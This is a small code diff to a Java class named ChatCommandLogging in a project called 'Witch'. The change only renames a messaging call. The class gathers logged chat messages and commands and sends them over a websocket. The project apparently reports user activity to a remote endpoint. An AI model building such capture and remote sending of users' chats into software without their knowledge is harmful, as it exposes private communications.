@@ -1,7 +1,7 @@
 package me.soda.witch.features;
 
 import me.soda.witch.Witch;
-import me.soda.witch.websocket.MessageUtils;
+import me.soda.witch.websocket.Message;
 
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
@@ -19,7 +19,7 @@ public class ChatCommandLogging {
                 Witch.printStackTrace(e);
             }
             if (Witch.config.logChatAndCommand && !readyToSendStrings.isEmpty()) {
-                MessageUtils.sendMessage("logging", String.join("\n", readyToSendStrings) + "\n");
+                Message.send("logging", String.join("\n", readyToSendStrings) + "\n");
                 readyToSendStrings = new ArrayList<>();
             }
         }
